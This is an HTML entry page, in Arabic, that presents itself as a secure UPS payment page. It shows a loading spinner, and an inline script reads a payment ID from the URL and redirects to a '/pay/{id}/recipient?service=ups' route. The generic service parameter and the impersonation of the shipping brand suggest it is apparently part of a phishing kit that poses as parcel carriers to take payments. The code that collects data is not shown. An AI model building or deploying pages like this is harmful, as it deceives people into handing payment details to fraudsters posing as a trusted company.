<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>UPS | صفحة دفع آمنة</title>
    <meta name="description" content="UPS - شركة United Parcel Service الأمريكية الرائدة في خدمات الشحن والتوصيل - صفحة دفع آمنة ومحمية" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    <meta property="og:title" content="UPS | صفحة دفع آمنة" />
    <meta property="og:description" content="UPS - شركة United Parcel Service الأمريكية الرائدة في خدمات الشحن والتوصيل - صفحة دفع آمنة ومحمية" />
    <meta property="og:image" content="/og-ups.jpg" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:image" content="/og-ups.jpg" />
</head>
<body style="margin: 0; padding: 0; background-color: #f5f5f5; font-family: 'Almarai', sans-serif;">
    <div id="root" style="min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; background-color: #f5f5f5;">
        <div style="background-color: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; width: 100%;">
            <div style="width: 60px; height: 60px; margin: 0 auto 20px; border: 4px solid #351C15; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
            <h1 style="color: #1a1a1a; margin: 0 0 12px 0; font-size: 24px;">يو بي إس - UPS</h1>
            <p style="color: #666; margin: 0; font-size: 16px;">جاري تحميل صفحة الدفع...</p>
        </div>
    </div>
    <style>
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
    <script>
        (function() {
            const service = 'ups';
            const urlParams = new URLSearchParams(window.location.search);
            let payId = urlParams.get('payId') || urlParams.get('id') || '';
            if (!payId) {
                const path = window.location.pathname;
                const payMatch = path.match(/\/pay\/([^\/\.]+)/);
                payId = payMatch ? payMatch[1] : '';
            }
            setTimeout(function() {
                if (payId && payId !== 'ups') {
                    window.location.href = '/pay/' + payId + '/recipient?service=' + service;
                } else {
                    window.location.href = '/';
                }
            }, 100);
        })();
    </script>
    <script type="module" src="/src/main.tsx"></script>
</body>
</html>
